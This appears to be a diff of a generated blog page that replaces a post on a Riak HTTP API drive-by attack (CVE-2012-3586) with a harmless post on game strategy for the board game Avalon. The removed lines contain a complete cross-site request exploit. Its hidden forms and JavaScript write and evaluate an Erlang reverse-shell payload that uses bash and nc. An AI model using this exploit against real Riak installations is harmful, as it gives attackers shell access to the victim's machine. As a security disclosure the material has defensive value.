@@ -5,11 +5,11 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>Riak Drive by Attack - Ben's Blog</title>
+  <title>Mechanically Solving Avalon - Ben's Blog</title>
   <meta name="author" content="Ben Murphy">
 
   
-  <meta name="description" content="Be careful with Riak HTTP API (CVE-2012-3586) This has been fixed in Riak 1.1.4 I would recommend not running the Riak HTTP API on a machine that you &hellip;">
+  <meta name="description" content="I&rsquo;ve been thinking for a while if it is possible for the &lsquo;good&rsquo; team in Avalon to follow some optimal strategy that would always &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,7 +18,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack">
+  <link rel="canonical" href="http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -79,7 +79,7 @@
   
   <header>
     
-      <h1 class="entry-title">Riak Drive by Attack</h1>
+      <h1 class="entry-title">Mechanically Solving Avalon</h1>
     
     
       <p class="meta">
@@ -95,93 +95,44 @@
   
 
 
-<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true"></time>
+<time datetime="2017-08-08T21:48:48+01:00" pubdate data-updated="true"></time>
         
       </p>
     
   </header>
 
 
-<div class="entry-content"><h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>
+<div class="entry-content"><p>I&rsquo;ve been thinking for a while if it is possible for the &lsquo;good&rsquo; team in Avalon to follow some optimal strategy that would always achieve victory. To simplify things this post will focus on finding an optimal strategy for 5 person Avalon when the Merlin(Commander) and the Assassin are both in play. It is important to note in this variant the &lsquo;good&rsquo; team at best can only win on average 2/3 of games because the &lsquo;evil&rsquo; team can always randomly pick the Merlin at the end of the game and will guess correctly 1 in 3 times. This question has also been answered before on <a href="https://boardgames.stackexchange.com/questions/20476/solution-to-avalon-board-game">stackexchange</a> but we will try and answer it without crypto. But we will use something very similar to crypto and similar strategies so I&rsquo;m not sure if we are adding anything useful.</p>
 
-<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>
-
-<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>
-
-<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>
-
-<p>The attack will perform the following actions</p>
+<p>The 5 person Avalon game is interesting because there are only 2 &lsquo;evil&rsquo; and 3 &lsquo;good&rsquo; people. This creates an easy mechanism to solve the game.</p>
 
 <ol>
-<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
-<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
-<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
+<li><p>After the game has been setup everyone secretly writes down a list of people they know are good. Merlin writes down the people who knows are good. Other good people pretend to write down a list of people but instead write gibberish.</p></li>
+<li><p>The lists are shuffled.</p></li>
+<li><p>There will be either 1, 2 or 3 non-gibberish lists depending on what the &lsquo;evil&rsquo; people do.</p></li>
+<li><p>If there is 1 non-gibberish list the &lsquo;good&rsquo; teams wins by just following the list because this is Merlin&rsquo;s list.</p></li>
+<li><p>If there is 2 or 3 non-gibberish lists then follow one list until it fails then switch to the other list. It is only possible for at most 2 missions to fail because after a list fails it is no longer used to pick teams. If only 2 missions fail then 3 missions succeed and the good team wins.</p></li>
 </ol>
 
 
-<p>By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause.</p>
+<p>The strategy also shows why the Assassin is so important in the 5 player variant. Because without the Assassin the Commander could just announce themselves and even if the evil team optimally bluffed and impersonated the Commander themselves they would still be guaranteed to lose.</p>
 
-<p>Click ‘Hack Me’ below to start the attack.</p>
+<p>This strategy only works when there are 2 &lsquo;evil&rsquo; players so only in the 5 and 6 player variants. Once a third &lsquo;evil&rsquo; player is introduced it is possible to fail 3 missions using 3 evil lists.</p>
 
-<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>
+<p>Can we solve 7+ player games using this strategy?</p>
 
+<p>If we have 3 evil players then we need to eliminate a list initially or run a mission that will eliminate two lists instead of one.</p>
 
+<p>Unlike the stackexchange solution we don&rsquo;t have a way to identify the author of a list so some of the strategies for eliminating lists do not work. However, we can still:</p>
 
-
-<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
-  <input name='lols' type='hidden' value='lols' />
-</form></p>
-
-
-
-
-<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>
+<ol>
+<li><p>If a mission fails then any list that contains all the members of the failing mission is also a bad list.</p></li>
+<li><p>If a mission fails and none of the members of the failing mission is in the compliment of a list then this list is a bad list.</p></li>
+<li><p>Any members common to all lists are good.</p></li>
+</ol>
 
 
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
-</form></p>
-
-
-
-
-<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
-</form>
-<input id='hack_me' type='button' value='Hack Me' /></p>
-
-
-
-
-<script type='text/javascript'>
-  //<![CDATA[
-    $("#hack_me").click(function() {
-        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
-            $("#insert_record_form")[0].submit();
-            setTimeout(write_file, 1000);
-        }
-    });
-    
-    function write_file() {
-        $("#write_file_form")[0].submit();
-        setTimeout(evaluate_file, 1000);           
-    }
-    
-    function evaluate_file() {
-        $("#evaluate_file_form")[0].submit();          
-    }
-  //]]>
-</script>
-
-
-
+<p>To test whether evil players have a winning strategy it should be possible to brute force all the combinations of evil lists: 7C4<sup>3</sup> + 7C4<sup>2</sup> + 7C4 => 44135 and see if any of them can&rsquo;t be solved by an optimal good team.</p>
 </div>
 
 
@@ -204,15 +155,21 @@
   
 
 
-<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true"></time>
+<time datetime="2017-08-08T21:48:48+01:00" pubdate data-updated="true"></time>
       
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/avalon/'>avalon</a>
+  
+</span>
 
 
     </p>
     
       <div class="sharing">
   
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/" >Tweet</a>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon/" >Tweet</a>
   
   
   <div class="g-plusone" data-size="medium"></div>
@@ -225,10 +182,8 @@
     
     <p class="meta">
       
-        <a class="basic-alignment left" href="/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/" title="Previous Post: Abusing Dynamic Types For Fun And Profit">&laquo; Abusing Dynamic Types For Fun And Profit</a>
+        <a class="basic-alignment left" href="/blog/2017/08/08/avalon-fonix-slash-grabyo-meta-snapshot/" title="Previous Post: Avalon Fonix/Grabyo Meta Snapshot">&laquo; Avalon Fonix/Grabyo Meta Snapshot</a>
       
-      
-        <a class="basic-alignment right" href="/blog/2015/06/04/redis-eval-lua-sandbox-escape/" title="Next Post: Redis EVAL Lua Sandbox Escape">Redis EVAL Lua Sandbox Escape &raquo;</a>
       
     </p>
   </footer>
@@ -294,8 +249,8 @@
       
         
         // var disqus_developer = 1;
-        var disqus_identifier = 'http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/';
-        var disqus_url = 'http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/';
+        var disqus_identifier = 'http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon/';
+        var disqus_url = 'http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon/';
         var disqus_script = 'embed.js';
       
     (function () {
